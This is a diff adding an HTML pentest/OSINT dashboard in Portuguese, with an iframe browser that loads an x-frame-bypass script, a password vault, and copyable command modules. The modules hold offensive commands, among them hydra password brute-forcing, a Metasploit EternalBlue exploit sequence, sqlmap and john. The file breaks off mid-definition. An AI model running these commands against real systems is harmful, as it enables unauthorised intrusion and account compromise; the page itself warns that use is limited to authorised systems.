@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LUA DE SANGUE ECLIPSE AXIOM CARLOS ACUTIS</title>
+<script type="module" src="https://unpkg.com/x-frame-bypass@1.0.2/x-frame-bypass.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<style>
+:root{--paper:#f7f5ef;--white:#fff;--red:#c41e3a;--redd:#8b0000;--soft:rgba(196,30,58,.15);
+--text:#1a1a1a;--muted:#555;--line:#e0c8c8}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{background:var(--paper);color:var(--text);font-family:'Courier New',monospace;font-size:13px;
+line-height:1.4;display:flex;flex-direction:column;height:100dvh;overflow-x:hidden}
+button{cursor:pointer;background:#fff;color:var(--red);border:1.5px solid var(--red);
+padding:5px 9px;font-size:11px;font-weight:700;font-family:inherit;white-space:nowrap}
+button:hover{background:var(--red);color:#fff}
+button.pri{background:var(--red);color:#fff}
+input,select,textarea{background:#fff;border:1.5px solid #cc7777;padding:5px 7px;font-size:12px;
+font-family:inherit;width:100%}
+input:focus,textarea:focus,select:focus{border-color:var(--red);outline:none;box-shadow:0 0 0 2px var(--soft)}
+h1{font-size:14px;color:#fff;letter-spacing:1px;text-transform:uppercase}
+h2{font-size:11px;color:var(--red);text-transform:uppercase;border-bottom:1px solid var(--line);padding-bottom:2px;margin-bottom:5px}
+h3{color:var(--red);font-size:12px;text-transform:uppercase;margin:8px 0 3px}
+.panel{background:var(--white);border:2px solid var(--red);padding:8px}
+.badge{display:inline-block;background:var(--red);color:#fff;font-size:8px;padding:1px 5px;margin-left:4px;letter-spacing:1px;font-weight:700}
+.app{display:flex;flex-direction:column;height:100%;padding:4px;gap:4px}
+/* HEADER */
+.header{flex-shrink:0;background:var(--red);color:#fff;padding:8px 10px}
+.header .row1{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:5px}
+.header .row1 small{opacity:.85;font-size:9px}
+.header .row1 .sp{flex:1}
+.header .row1 button{background:#fff;color:var(--red)}
+.header .row2{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
+.header .row2 input{flex:1;min-width:110px}
+.header .row2 select{width:130px;flex:0 0 auto}
+.header .row2 button{flex:0 0 auto}
+.quick{display:flex;flex-wrap:wrap;gap:2px;margin-top:5px;max-height:34px;overflow-y:auto}
+.quick button{font-size:9px;padding:3px 6px;background:#fff;color:var(--red);border:1px solid #e09999}
+/* TABS */
+.tabs{display:flex;flex-wrap:wrap;gap:2px;flex-shrink:0}
+.tabs button{flex:1 1 auto;font-size:10px;padding:7px 4px;border:1.5px solid var(--red);background:#fff;color:var(--red)}
+.tabs button.on{background:var(--red);color:#fff}
+.pane{display:none;flex:1;min-height:0;overflow:auto}
+.pane.on{display:flex;flex-direction:column;gap:4px}
+/* NAVEGADOR */
+.viewer-wrap{height:200px;border:2px solid #e09999;position:relative;background:#fff;flex-shrink:0}
+.viewer-wrap iframe{width:100%;height:100%;border:none}
+.viewer-label{position:absolute;top:0;left:0;font-size:8px;background:rgba(255,255,255,.95);color:var(--red);
+padding:2px 5px;z-index:5;border:1px solid #ffcccc;font-weight:700;max-width:90%;overflow:hidden;
+text-overflow:ellipsis;white-space:nowrap}
+.wallbar{display:flex;gap:3px;align-items:center;flex-wrap:wrap}
+.wall{display:grid;gap:5px;grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}
+.cell{position:relative;overflow:hidden;border:1.5px solid #e09999;background:#fff;min-height:110px;cursor:pointer}
+.cell:hover{border-color:var(--red);box-shadow:0 0 8px var(--soft)}
+.cell iframe{width:100%;height:100%;border:none;pointer-events:none}
+.cell .lb{position:absolute;top:0;left:0;font-size:7px;background:rgba(255,255,255,.95);color:var(--red);
+padding:2px 4px;z-index:2;border:1px solid #ffcccc;font-weight:700;max-width:94%;white-space:nowrap;overflow:hidden}
+.term{background:#fffafa;border:1.5px solid #dd9999;padding:6px;font-size:11px;overflow-y:auto;
+white-space:pre-wrap;color:var(--redd);min-height:90px;max-height:160px;flex:1}
+.cmdrow{display:flex;gap:3px;margin-top:4px}
+.cmdrow input{flex:1}
+.cblock{background:#fff8f8;border:1px solid #ffcccc;padding:5px;margin:4px 0;font-size:10px}
+.cblock .d{color:var(--muted);font-size:9px}
+.cblock .c{color:var(--redd);font-weight:700;word-break:break-all;white-space:pre-wrap}
+.mini{font-size:9px;padding:2px 6px}
+.osint{font-size:10px;margin-top:4px;padding:4px;background:#fff8f8;border:1px solid #ffcccc;max-height:70px;overflow:auto}
+/* BANCO */
+.card{background:#fff;border:1px solid #888;border-left:10px solid var(--red);margin-bottom:10px;padding:10px}
+.card .t{font-weight:900;font-size:13px}
+.card .m{font-size:10px;color:var(--muted);margin:4px 0}
+.card .b{font-size:12px;line-height:1.5;word-break:break-word;white-space:pre-wrap}
+.card .b a{color:#003f9e}
+.card .b img{max-width:100%;border:1px solid #ccc;display:block;margin:5px 0}
+.card .b audio,.card .b video{max-width:100%;display:block;margin:5px 0}
+.card .a{display:flex;gap:5px;flex-wrap:wrap;margin-top:8px}
+.tag{display:inline-block;font-size:9px;background:#f0e6e6;color:var(--redd);padding:1px 6px;margin-right:3px;border:1px solid #e0c0c0}
+.form{background:#fff;border:2px solid var(--red);border-left:8px solid var(--red);padding:10px;margin-bottom:8px}
+.form label{display:block;font-size:10px;color:var(--muted);text-transform:uppercase;font-weight:700;margin:7px 0 2px}
+.colors{display:grid;grid-template-columns:repeat(4,1fr);gap:3px}
+.colors button{padding:6px 2px;font-size:9px;border:2px solid #222}
+.colors .sel{outline:3px solid #555}
+.fr{background:#a40000;color:#fff}.fy{background:#c49a00;color:#111}.fg{background:#1d7f3b;color:#fff}
+.fb{background:#003f9e;color:#fff}.fp{background:#5a1a7a;color:#fff}.fk{background:#111;color:#fff}
+.fo{background:#c45a00;color:#fff}.fw{background:#eee;color:#111}
+.hidden{display:none!important}
+.locked{border:2px solid var(--red);background:#fff0f0;padding:12px;text-align:center;font-weight:900;color:var(--redd)}
+/* VERSÕES / COFRE */
+.vrow{display:flex;justify-content:space-between;align-items:center;gap:6px;border:1px solid #e0c0c0;
+background:#fff;padding:6px 8px;margin-bottom:4px;font-size:11px;flex-wrap:wrap}
+.pwd{border-left-color:#5a1a7a}
+/* KALI */
+.kcmd{background:#111;color:#00ff88;padding:7px 9px;font-size:11px;margin-bottom:5px;cursor:pointer;border:1px solid #333}
+.kcmd:hover{border-color:#00ff88}
+.kcmd small{color:#888;display:block}
+/* MODAL + FLASH */
+.ov{display:none;position:fixed;inset:0;background:rgba(80,0,10,.6);z-index:60;padding:14px;overflow:auto}
+.ov.on{display:flex;align-items:flex-start;justify-content:center}
+.modal{background:var(--paper);border:3px solid var(--red);padding:12px;width:100%;max-width:620px}
+.mrow{display:flex;gap:8px;justify-content:flex-end;margin-top:10px}
+#flash{position:fixed;bottom:12px;left:50%;transform:translateX(-50%);background:var(--red);color:#fff;
+padding:8px 14px;font-size:11px;font-weight:700;opacity:0;transition:.3s;z-index:99;pointer-events:none;max-width:92vw}
+#flash.on{opacity:1}
+/* GUIA */
+.gbox{background:#fffafa;border:2px solid var(--red);padding:10px;font-size:11px;line-height:1.5}
+.gbox ul{padding-left:16px;margin:3px 0}
+.warn{color:var(--red);font-weight:700;margin-top:8px}
+@media(max-width:640px){
+ .viewer-wrap{height:170px}
+ .cell{min-height:95px}
+ .wall{grid-template-columns:repeat(2,1fr)!important}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+<!-- HEADER -->
+<header class="header">
+  <div class="row1">
+    <h1>🌑 LUA DE SANGUE ECLIPSE <span class="badge">SCP</span></h1>
+    <small>AXIOM · CARLOS ACUTIS · SECURE / CONTAIN / PROTECT</small><span class="sp"></span>
+    <button onclick="doPrint()" title="Print">📸 PRINT</button>
+  </div>
+  <div class="row2">
+    <input id="urlbar" value="https://pt.wikipedia.org/wiki/Carlos_Acutis">
+    <button onclick="goUrl()">➤ IR</button>
+    <button onclick="copyPage()">📋 COPIAR</button>
+    <select id="mirror" onchange="changeMirror()">
+      <option value="">Espelho…</option>
+      <option value="https://pt.wikipedia.org">Wikipédia PT</option>
+      <option value="https://archive.org">Archive.org</option>
+      <option value="https://web.archive.org">Wayback</option>
+      <option value="https://lite.duckduckgo.com/lite">Duck Lite</option>
+    </select>
+  </div>
+  <div class="quick">
+    <button onclick="goSite('https://archive.org')">Archive</button>
+    <button onclick="goSite('https://web.archive.org')">Wayback</button>
+    <button onclick="goSite('https://pt.wikipedia.org')">Wiki</button>
+    <button onclick="goSite('https://lite.duckduckgo.com/lite')">Duck</button>
+    <button onclick="goSite('https://shodan.io')">Shodan↗</button>
+    <button onclick="goSite('https://crt.sh')">crt.sh</button>
+    <button onclick="goSite('https://haveibeenpwned.com')">HIBP↗</button>
+    <button onclick="goSite('https://virustotal.com')">VT↗</button>
+    <button onclick="goSite('https://urlscan.io')">URLScan↗</button>
+    <button onclick="goSite('https://owasp.org')">OWASP</button>
+    <button onclick="goSite('https://nmap.org')">Nmap</button>
+    <button onclick="goSite('https://kali.org')">Kali</button>
+  </div>
+</header>
+
+<!-- TABS -->
+<nav class="tabs">
+  <button class="on" data-t="nav">🌐 NAVEGADOR</button>
+  <button data-t="db">🗂 BANCO</button>
+  <button data-t="ver">📜 VERSÕES</button>
+  <button data-t="vault">🔑 COFRE</button>
+  <button data-t="kali">⎇ KALI</button>
+  <button data-t="bkp">💾 BACKUP</button>
+  <button data-t="guia">📖 GUIA</button>
+</nav>
+
+<!-- PANE NAVEGADOR -->
+<section class="pane on" id="p-nav">
+  <div class="panel">
+    <div class="viewer-wrap">
+      <iframe id="viewer" src="https://pt.wikipedia.org/wiki/Carlos_Acutis" title="viewer" referrerpolicy="no-referrer"></iframe>
+      <div class="viewer-label" id="viewerLabel">Wikipédia</div>
+    </div>
+  </div>
+  <div class="panel" style="flex:1;display:flex;flex-direction:column;min-height:200px">
+    <div class="wallbar">
+      <h2 style="border:none;margin:0">Iframe Wall — Archive.org</h2>
+      <select id="density" style="width:60px;font-size:10px">
+        <option>12</option><option selected>24</option><option>48</option>
+      </select>
+      <button class="mini" onclick="rebuildWall()">🔄</button>
+      <button class="mini" onclick="refreshWall()">⟳</button>
+      <span id="wallCount" style="font-size:9px;color:var(--muted)"></span>
+    </div>
+    <div id="wallBox" style="flex:1;overflow:auto;margin-top:5px"></div>
+  </div>
+  <div class="panel">
+    <h2>Terminal de consulta (OSINT via APIs públicas)</h2>
+    <div id="term" class="term">lua:~$ digite help</div>
+    <div class="cmdrow">
+      <input id="termline" placeholder="nmap | whois | dig | sub | geo | ports | archive | help | clear">
+      <button class="mini" onclick="execTerm()">EXEC</button>
+      <button class="mini" onclick="clearTerm()">LIMPAR</button>
+    </div>
+    <div style="display:flex;gap:3px;flex-wrap:wrap;margin-top:4px">
+      <button class="mini" onclick="osint('whois')">WHOIS</button>
+      <button class="mini" onclick="osint('geo')">GEO</button>
+      <button class="mini" onclick="osint('dns')">DNS</button>
+      <button class="mini" onclick="osint('sub')">SUBDOM</button>
+      <button class="mini" onclick="osint('ports')">PORTS</button>
+      <button class="mini" onclick="osint('archive')">ARCHIVE</button>
+      <span id="osintout" style="flex:1;min-width:120px" class="osint">Resultados aqui</span>
+    </div>
+  </div>
+  <div class="panel">
+    <h2>Módulos de comandos</h2>
+    <div style="display:flex;gap:3px;flex-wrap:wrap;margin-bottom:4px">
+      <button class="mini" onclick="mods('recon')">RECON</button>
+      <button class="mini" onclick="mods('nmap')">NMAP</button>
+      <button class="mini" onclick="mods('hydra')">HYDRA</button>
+      <button class="mini" onclick="mods('msf')">MSF</button>
+      <button class="mini" onclick="mods('curl')">CURL</button>
+      <button class="mini" onclick="mods('dns')">DNS</button>
+      <button class="mini" onclick="mods('sub')">SUBDOM</button>
+      <button class="mini" onclick="mods('sqlmap')">SQLMAP</button>
+      <button class="mini" onclick="mods('john')">JOHN</button>
+      <button class="mini" onclick="mods('instalar')">INSTALAR</button>
+    </div>
+    <div id="modsout" style="font-size:10px;max-height:160px;overflow:auto;background:#fff8f8;border:1px solid #ffcccc;padding:4px">
+      Clique num módulo. Cada comando tem explicação + COPIAR.
+    </div>
+  </div>
+  <div class="panel">
+    <div style="display:flex;gap:8px;flex-wrap:wrap">
+      <div style="flex:1;min-width:130px"><h2>Targets</h2>
+        <div style="display:flex;gap:3px"><input id="tgt" placeholder="IP ou domínio" style="flex:1"><button class="mini" onclick="addTgt()">+</button></div>
+        <div id="tgts" style="font-size:10px;max-height:60px;overflow:auto"></div></div>
+      <div style="flex:1;min-width:130px"><h2>Evidências</h2>
+        <button class="mini" onclick="addEv()">📸 CAPTURAR URL</button>
+        <div id="evs" style="font-size:9px;max-height:60px;overflow:auto"></div></div>
+      <div style="flex:1.4;min-width:150px"><h2>Dossiê</h2>
+        <textarea id="notes" style="height:40px;font-size:11px"></textarea>
+        <div style="display:flex;gap:3px;margin-top:3px;flex-wrap:wrap">
+          <button class="mini" onclick="saveDos()">SALVAR</button>
+          <button class="mini" onclick="expDos()">TXT DOSSIÊ</button>
+          <button class="mini" onclick="expCmds()">TXT COMANDOS</button>
+        </div></div>
+    </div>
+  </div>
+</section>
+
+<!-- PANE BANCO -->
+<section class="pane" id="p-db">
+  <button class="pri" onclick="showForm()">+ NOVA ENTRADA</button>
+  <div id="form" class="form hidden">
+    <label>Título</label><input id="fTitle">
+    <label>Tipo</label>
+    <select id="fType" onchange="updType()">
+      <option value="text">📝 Texto</option><option value="link">🔗 Link</option>
+      <option value="image">🖼 Imagem</option><option value="audio">🎵 Áudio</option>
+      <option value="video">🎬 Vídeo</option><option value="file">📎 Arquivo</option>
+    </select>
+    <div id="wContent"><label>Conteúdo / URL</label><textarea id="fContent"></textarea></div>
+    <div id="wFile" class="hidden"><label>Arquivo (máx 20MB)</label><input type="file" id="fFile"></div>
+    <label>Tags (vírgula)</label><input id="fTags">
+    <label>Classificação</label>
+    <div class="colors" id="colorRow">
+      <button type="button" class="fr" data-c="red">RESTRITO</button>
+      <button type="button" class="fy" data-c="yellow">MÉDIO</button>
+      <button type="button" class="fg sel" data-c="green">SEGURO</button>
+      <button type="button" class="fb" data-c="blue">INFO</button>
+      <button type="button" class="fp" data-c="purple">ANOMALIA</button>
+      <button type="button" class="fo" data-c="orange">KETER</button>
+      <button type="button" class="fk" data-c="black">ADMIN</button>
+      <button type="button" class="fw" data-c="white">NEUTRO</button>
+    </div>
+    <label>Senha (opcional)</label><input type="password" id="fPass">
+    <div class="mrow"><button onclick="hideForm()">CANCELAR</button><button class="pri" onclick="addEntry()">ADICIONAR</button></div>
+  </div>
+  <div id="cards"></div>
+</section>
+
+<!-- PANE VERSÕES -->
+<section class="pane" id="p-ver">
+  <p style="font-size:11px;color:var(--muted)">Toda edição e toda restauração registra a versão anterior aqui. Snapshots do banco completo também aparecem.</p>
+  <div id="verlist"></div>
+</section>
+
+<!-- PANE COFRE -->
+<section class="pane" id="p-vault">
+  <div class="panel">
+    <h2>Senha mestra</h2>
+    <input type="password" id="master" placeholder="Senha mestra (mín 8)">
+    <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap">
+      <button class="pri" onclick="setMaster()">DEFINIR MESTRA</button>
+      <button onclick="unlockVault()">AUTENTICAR SESSÃO</button>
+    </div>
+    <div id="vinfo" style="font-size:10px;color:var(--muted);margin-top:6px"></div>
+    <p style="font-size:10px;color:var(--muted);margin-top:4px">AES-GCM + PBKDF2 (100k) via WebCrypto. Sem mestra, o cofre não abre — sem exceções.</p>
+  </div>
+  <button class="pri" onclick="showPwdForm()">+ ADICIONAR SENHA</button>
+  <div id="pwdForm" class="form hidden" style="border-left-color:#5a1a7a">
+    <label>Serviço</label><input id="pTitle">
+    <label>Usuário</label><input id="pUser">
+    <label>Senha</label><input type="text" id="pPass">
+    <label>Notas</label><textarea id="pNotes" style="min-height:40px"></textarea>
+    <div class="mrow"><button onclick="hidePwdForm()">CANCELAR</button><button class="pri" onclick="savePwd()">SALVAR NO COFRE</button></div>
+  </div>
+  <div id="pwdList"></div>
+</section>
+
+<!-- PANE KALI -->
+<section class="pane" id="p-kali">
+  <p style="font-size:11px;color:var(--muted)">Toque num comando para copiar. Use apenas em ativos autorizados.</p>
+  <div id="klist"></div>
+</section>
+
+<!-- PANE BACKUP -->
+<section class="pane" id="p-bkp">
+  <div class="panel"><h2>⇧ Exportar tudo (JSON)</h2>
+    <p style="font-size:11px;color:var(--muted)">Entradas, versões, cofre (cifrado) e dossiê.</p>
+    <button class="pri" onclick="doExport()">⇧ EXPORTAR AGORA</button></div>
+  <div class="panel"><h2>⇩ Importar (substitui tudo)</h2>
+    <input type="file" id="impFile" accept=".json">
+    <button onclick="doImport()">⇩ IMPORTAR</button></div>
+  <div class="panel"><h2>🔀 Mesclar (só o novo)</h2>
+    <input type="file" id="mrgFile" accept=".json">
+    <button onclick="doMerge()">🔀 MESCLAR</button></div>
+  <div class="panel"><h2>📷 Snapshot do banco</h2>
+    <button onclick="snapshot()">CRIAR SNAPSHOT</button></div>
+  <div class="panel"><h2>⚡ Console de diagnóstico (sem eval)</h2>
+    <div id="dbg" style="background:#111;color:#00ff88;font-size:11px;padding:8px;min-height:70px;white-space:pre-wrap">[ AXIOM ] online</div>
+    <div style="display:flex;gap:4px;margin-top:4px">
+      <input id="dbgIn" placeholder="help | stats | entries | vault" style="flex:1">
+      <button class="mini" onclick="dbgExec()">EXEC</button>
+    </div></div>
+  <div class="panel"><h2>🗑 Zona de contenção</h2>
+    <button onclick="wipe()">APAGAR TODOS OS DADOS</button></div>
+</section>
+
+<!-- PANE GUIA -->
+<section class="pane" id="p-guia">
+  <div class="panel"><div class="gbox">
+    <h3>1. Navegador</h3><ul>
+      <li>Digite a URL e ➤ IR. Espelhos e atalhos prontos acima.</li>
+      <li><b>📋 COPIAR</b> copia o texto integral da página carregada; se o site bloquear leitura (Same-Origin Policy), copia a URL e avisa.</li>
+      <li><b>📸 PRINT</b> captura o app inteiro em PNG. Para capturar o conteúdo do iframe quando ele carregar via Wayback/proxy, use o print nativo do celular (o botão abre o snapshot em aba nova quando necessário).</li></ul>
+    <h3>2. Iframe Wall</h3><ul>
+      <li>Snapshots históricos do Wayback Machine (estratégia archive.org original).</li>
+      <li>Densidade 12/24/48; toque na célula para expandir no visualizador.</li></ul>
+    <h3>3. Terminal / OSINT</h3><ul>
+      <li>Comandos: nmap, whois, dig, sub, geo, ports, archive, help, clear.</li>
+      <li>Consultas saem para APIs públicas (hackertarget, Google DNS, crt.sh, wayback) — não consulte alvos sigilosos por aqui; use o Kali local.</li></ul>
+    <h3>4. Banco</h3><ul>
+      <li>Entradas de texto/link/imagem/áudio/vídeo/arquivo, com tags, classificação SCP e senha por entrada.</li>
+      <li>📋 Copiar copia o texto integral; ✏ Editar registra a versão anterior em 📜 VERSÕES.</li></ul>
+    <h3>5. Cofre</h3><ul>
+      <li>Defina a mestra (mín 8). Senhas cifradas AES-GCM/PBKDF2. Revelar/copy exigem a mestra.</li></ul>
+    <h3>6. Backup</h3><ul>
+      <li>Export/Import/Merge JSON + snapshot + console de diagnóstico.</li></ul>
+    <p class="warn">⚠️ Uso somente em sistemas próprios ou com autorização por escrito. Uso não autorizado é ilegal.</p>
+  </div></div>
+</section>
+
+</div><!-- /app -->
+
+<!-- MODAIS -->
+<div class="ov" id="mVer"><div class="modal">
+  <h2 id="verT">Versão</h2>
+  <div id="verB" style="background:#fff;border:1px solid #ccc;padding:8px;font-size:12px;white-space:pre-wrap;max-height:45vh;overflow:auto;word-break:break-word"></div>
+  <div class="mrow"><button onclick="closeModal('mVer')">FECHAR</button><button class="pri" id="verRestore">⤺ RESTAURAR</button></div>
+</div></div>
+<div id="flash"></div>
+
+<script>
+'use strict';
+/* ===== UTIL ===== */
+const $=id=>document.getElementById(id);
+const esc=s=>{const d=document.createElement('div');d.textContent=s==null?'':String(s);return d.innerHTML;};
+const uid=()=>'id_'+Date.now().toString(36)+Math.random().toString(36).slice(2,8);
+const fmt=iso=>iso?new Date(iso).toLocaleString('pt-BR'):'—';
+let flashT;
+function flash(m){const f=$('flash');f.textContent=m;f.classList.add('on');clearTimeout(flashT);flashT=setTimeout(()=>f.classList.remove('on'),3000);}
+function copyText(t){navigator.clipboard.writeText(t).then(()=>flash('📋 Copiado!')).catch(()=>flash('Falha ao copiar',true));}
+function dl(n,b){const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=n;a.click();setTimeout(()=>URL.revokeObjectURL(a.href),2e3);}
+const COLORS={red:'#a40000',yellow:'#c49a00',green:'#1d7f3b',blue:'#003f9e',purple:'#5a1a7a',black:'#111',orange:'#c45a00',white:'#888'};
+const LABELS={red:'RESTRITO',yellow:'MÉDIO',green:'SEGURO',blue:'INFO',purple:'ANOMALIA',black:'ADMIN',orange:'KETER',white:'NEUTRO'};
+
+/* ===== ABAS ===== */
+document.querySelectorAll('.tabs button').forEach(b=>b.onclick=()=>{
+  document.querySelectorAll('.tabs button').forEach(x=>x.classList.toggle('on',x===b));
+  document.querySelectorAll('.pane').forEach(p=>p.classList.toggle('on',p.id==='p-'+b.dataset.t));
+  if(b.dataset.t==='db')renderCards();if(b.dataset.t==='ver')renderVers();
+  if(b.dataset.t==='vault')renderVault();if(b.dataset.t==='kali')renderKali();
+});
+
+/* ===== NAVEGADOR ===== */
+function goUrl(){let u=$('urlbar').value.trim();if(!u)return;if(!/^https?:/i.test(u))u='https://'+u;$('urlbar').value=u;$('viewer').src=u;$('viewerLabel').textContent=u.replace(/^https?:\/\//,'').slice(0,48);}
+function changeMirror(){const v=$('mirror').value;if(v){$('urlbar').value=v;goUrl();$('mirror').selectedIndex=0;}}
+function goSite(u){$('urlbar').value=u;goUrl();}
+function copyPage(){
+  const u=$('urlbar').value;
+  try{const d=$('viewer').contentDocument||$('viewer').contentWindow.document;
+    const t=(d&&d.body&&d.body.innerText)||'';
+    if(t.trim().length>30){copyText(t.slice(0,30000));return;}
+  }catch(e){}
+  copyText(u);flash('Site bloqueia leitura — URL copiada. Use ↗ print nativo para o conteúdo.');
+}
+/* IFRAME WALL — estratégia archive.org original */
+const BASES=['google.com','wikipedia.org','github.com','stackoverflow.com','reddit.com','nmap.org','kali.org','shodan.io','virustotal.com','haveibeenpwned.com','crt.sh','archive.org','owasp.org','mitre.org','debian.org','ubuntu.com','startpage.com','duckduckgo.com','en.wikipedia.org/wiki/Penetration_test','en.wikipedia.org/wiki/Kali_Linux','pt.wikipedia.org/wiki/Seguranca_da_informacao'];
+const YEARS=['2024','2023','2022','2021','2020','2019'];
+function sources(){
+  const n=parseInt($('density').value)||24,out=[];
+  for(let i=0;i<n;i++){const s=BASES[i%BASES.length],y=YEARS[i%YEARS.length],m=i%2?'06':'01';
+    out.push('https://web.archive.org/web/'+y+m+'01000000if_/https://'+s);}
+  for(let i=out.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[out[i],out[j]]=[out[j],out[i]];}
+  return out;
+}
+function rebuildWall(){
+  const box=$('wallBox'),src=sources();box.innerHTML='';
+  const w=document.createElement('div');w.className='wall';
+  src.forEach((u,i)=>{
+    const c=document.createElement('div');c.className='cell';
+    const lb=document.createElement('div');lb.className='lb';
+    let s=u.replace('https://web.archive.org/web/','').replace('if_/https://','→');
+    s=s.length>36?s.slice(0,33)+'…':s;lb.textContent=(i+1)+'. '+s;c.appendChild(lb);
+    const f=document.createElement('iframe');f.setAttribute('is','x-frame-bypass');f.loading='lazy';f.src=u;f.title='snap '+(i+1);c.appendChild(f);
+    c.onclick=()=>{$('urlbar').value=u;$('viewer').src=u;$('viewerLabel').textContent=s;flash('Snapshot expandido');};
+    w.appendChild(c);
+  });
+  box.appendChild(w);$('wallCount').textContent='('+src.length+')';
+}
+function refreshWall(){document.querySelectorAll('.cell iframe').forEach(f=>{const s=f.src;f.src='';setTimeout(()=>f.src=s,50);});}
+rebuildWall();
+
+/* PRINT */
+function doPrint(){
+  flash('Capturando…');
+  const u=$('urlbar').value.trim();
+  html2canvas(document.body,{backgroundColor:'#f7f5ef',scale:2}).then(c=>{
+    c.toBlob(b=>{dl('print-lua-eclipse-'+Date.now()+'.png',b);flash('📸 Print salvo!');},'image/png');
+    // abre snapshot em aba nova para print nativo completo (inclui conteúdo do iframe)
+    if(u&&!/^https?:/.test(u))return;
+    setTimeout(()=>{if(confirm('Abrir a página atual em aba nova para print nativo (captura o conteúdo do iframe)?'))window.open(/^https?:/.test(u)?u:'https://'+u,'_blank');},400);
+  }).catch(e=>flash('Erro no print: '+e.message));
+}
+
+/* TERMINAL */
+function termAdd(h){$('term').innerHTML+=h+'\n';$('term').scrollTop=$('term').scrollHeight;}
+function clearTerm(){$('term').innerHTML='lua:~$ limpo\n';}
+function execTerm(){
+  const raw=$('termline').value.trim();if(!raw)return;
+  termAdd('lua:~$ '+esc(raw));$('termline').value='';
+  const c=raw.toLowerCase();
+  if(c==='help'||c==='?'){termAdd('nmap | whois | dig | sub | geo | ports | archive | clear');return;}
+  if(c==='clear'||c==='cls'){clearTerm();return;}
+  const alvo=raw.split(/\s+/)[1]||($('urlbar').value.replace(/^https?:\/\//,'').split('/')[0]||'');
+  if(c.startsWith('nmap')||c.startsWith('ports')){
+    termAdd('→ via api.hackertarget.com (não é nmap local): '+esc(alvo));
+    fetch('https://api.hackertarget.com/nmap/?q='+encodeURIComponent(alvo)).then(r=>r.text())
+      .then(t=>termAdd(t.split('\n').slice(0,12).join('\n'))).catch(()=>termAdd('Falha. Use no Linux: nmap -sV -T4 '+alvo));return;}
+  if(c.startsWith('whois')){termAdd('→ whois via who-dat.as93.net');
+    fetch('https://who-dat.as93.net/'+alvo).then(r=>r.json()).then(d=>{
+      termAdd([d.registrar&&'Registrar: '+d.registrar,d.creationDate&&'Criado: '+d.creationDate,d.nameServers&&'NS: '+d.nameServers].filter(Boolean).join('\n')||'sem dados');})
+      .catch(()=>termAdd('Falha. Use: whois '+alvo));return;}
+  if(c.startsWith('dig')||c.startsWith('dns')){
+    fetch('https://dns.google/resolve?name='+alvo+'&type=A').then(r=>r.json()).then(d=>{
+      (d.Answer||[]).forEach(a=>termAdd(a.name+' → '+a.data));if(!d.Answer)termAdd('sem registros');}).catch(()=>termAdd('Falha'));return;}
+  if(c.startsWith('sub')){termAdd('→ crt.sh');
+    fetch('https://crt.sh/?q=%25.'+alvo+'&output=json').then(r=>r.json()).then(data=>{
+      const set={};(data||[]).slice(0,40).forEach(i=>(i.name_value||'').split('\n').forEach(n=>set[n]=1));
+      termAdd('('+Object.keys(set).length+')\n'+Object.keys(set).join('\n'));}).catch(()=>termAdd('Falha'));return;}
+  if(c.startsWith('geo')){const t=raw.split(/\s+/)[1]||alvo;
+    fetch('https://ipwho.is/'+encodeURIComponent(t)).then(r=>r.json()).then(d=>{
+      termAdd(d.success?(d.ip+' | '+d.city+', '+d.country+' | '+(d.connection&&d.connection.isp||'')):'sem dados');})
+      .catch(()=>termAdd('Falha'));return;}
+  if(c.startsWith('archive')){
+    fetch('https://archive.org/wayback/available?url='+alvo).then(r=>r.json()).then(d=>{
+      termAdd(d.archived_snapshots&&d.archived_snapshots.closest?('Snapshot: '+d.archived_snapshots.closest.timestamp):'nenhum snapshot');}).catch(()=>termAdd('Falha'));return;}
+  termAdd('desconhecido — digite help');
+}
+$('termline').addEventListener('keydown',e=>{if(e.key==='Enter')execTerm();});
+function osint(t){const a=$('urlbar').value.replace(/^https?:\/\//,'').split('/')[0]||'exemplo.com';
+  $('osintout').innerHTML='<b>'+t.toUpperCase()+'</b><br>Digite no terminal: '+({whois:'whois',geo:'geo',dns:'dig',sub:'sub',ports:'ports',archive:'archive'}[t])+' '+esc(a);}
+
+/* MÓDULOS */
+const MODS={
+ recon:[['WHOIS','whois dominio.com'],['DNS ANY','dig dominio.com ANY +short'],['WhatWeb','whatweb dominio.com'],['Headers','curl -sI https://dominio.com']],
+ nmap:[['Rápido','nmap -sS -sV -T4 -F alvo.com'],['Padrão','nmap -sS -sV -sC -O -T4 alvo.com'],['Completo','nmap -sS -sV -sC -O -A -T4 -p- alvo.com'],['Ping sweep','nmap -sn 192.168.1.0/24']],
+ hydra:[['SSH','hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100'],['FTP','hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100'],['HTTP POST','hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"']],
+ msf:[['Iniciar','msfconsole -q'],['Buscar','search eternalblue'],['Usar','use exploit/windows/smb/ms17_010_eternalblue'],['Config + run','set RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nexploit']],
+ curl:[['Headers','curl -sI https://dominio.com'],['HTML','curl -s https://dominio.com'],['POST','curl -s -X POST -d "user=admin&pass=123" https://dominio.com/login']],
+ dns:[['A','dig dominio.com A +short'],['MX','dig dominio.com MX +short'],['NS','dig dominio.com NS +short'],['TXT','dig dominio.com TXT +short']],
+ sub:[['Sublist3r','sublist3r -d dominio.com -o subdomains.txt'],['Amass','amass enum -d dominio.com -o sub_amass.txt'],['crt.sh','curl -s "https://crt.sh/?q=%25.dominio.com&output=json" | jq -r \'.[].name_value\' | sort -u']],
+ sqlmap:[['Teste','sqlmap -u "https://dominio.com/pagina?id=1" --batch'],['Bancos','sqlmap -u "https://dominio.com/pagina?id=1" --dbs --batch']],
+ john:[['Identificar','john --identify hash.txt'],['Wordlist','john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt']],
